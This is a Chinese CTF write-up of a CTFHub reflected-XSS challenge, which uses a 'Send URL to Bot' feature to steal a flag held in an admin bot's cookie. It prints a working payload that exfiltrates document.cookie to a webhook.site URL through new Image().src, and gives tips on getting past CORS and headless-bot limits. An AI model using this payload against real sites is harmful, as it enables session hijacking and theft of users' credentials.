---
title: CTFHub XSS 反射型
date: 2026-10-03
categories: CTFHub Web
tags: CTFHub Web XSS 反射型
---
# 题目：CTFHub XSS 反射型

## 题目描述
页面存在可控输入框，输入内容会直接展示在页面中，后端无任何过滤。平台提供  Send URL to Bot  功能，可让后台管理员Bot访问指定链接，Flag存储在Bot的Cookie中，需要通过XSS窃取Bot Cookie获取Flag。
 
## 解题思路
1. 首先测试页面输入点，确认后端无字符过滤，可直接执行原生JS代码，存在可利用的反射型XSS漏洞。
2. 由于Flag存放在后台Bot的Cookie中，本地执行JS无法获取有效Flag，必须让Bot执行恶意JS代码。
3. 利用不受跨域限制的  new Image()  构造请求，读取Bot的Cookie，将Cookie拼接在URL参数中，外带到webhook.site接收平台。
4. 发送带XSS payload的链接给Bot，监听webhook请求记录，从URL查询参数中提取Bot Cookie，最终获取Flag。
 
## 解题步骤
1. 漏洞验证
在输入框输入基础测试 payload：
<script>alert(1)</script>
提交后页面成功弹窗，验证页面存在无过滤的反射型XSS漏洞。
 
2. 构造外带Payload
使用图片请求外带Cookie（无跨域限制，稳定性强），最终可用payload：
<script>new Image().src="https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c="+document.cookie</script>

3. 触发Bot访问
将构造好的payload粘贴到靶场输入框并提交，复制浏览器完整URL，粘贴至页面  Send URL to Bot  输入框并发送。

4. 获取Cookie与Flag
刷新webhook.site页面，接收Bot的请求记录，在  Query strings  参数中获取Bot Cookie：
 flag=ctfhub{f18f12d1fff0cb27ac698d09} 
 最终Flag：ctfhub{f18f12d1fff0cb27ac698d09}

## 踩坑指南
1. 外网接收平台连通问题
webhook.site为境外服务器，CTFHub沙箱Bot大概率出现访问超时、拦截请求的情况，是本题最大难点，多次重试才可成功接收请求。

2. 弹窗Payload无效
 alert(document.cookie)  仅能在本地浏览器弹窗，Bot为无头浏览器，无法查看弹窗内容，必须使用数据外带方式。

3. 禁止使用页面跳转Payload
 location.href  会强制跳转页面，导致Bot脚本执行中断，无法成功外带数据。

4. 跨域问题规避
fetch、AJAX请求易受浏览器CORS跨域策略拦截， new Image()  图片GET请求无跨域限制，是XSS外带最优选择。
 
## 知识点总结
1. 反射型XSS特性
payload仅单次反射执行，不存储在服务器，需要诱导用户/Bot访问恶意链接才能触发，属于非持久化XSS。

2. XSS OOB数据外带
当无法直接展示数据时，可通过图片、DNS解析、GET请求等方式，将敏感数据带出到自己的接收平台，是CTF XSS题型核心思路。

3. document.cookie 读取规则
Cookie未设置HttpOnly属性时，可被JS直接读取；若开启HttpOnly，前端JS将无法获取Cookie。

4. CTF Bot题型套路
Flag存放于管理员/机器人客户端中，本地无法直接获取，必须构造漏洞语句，让服务端Bot执行并外带数据。
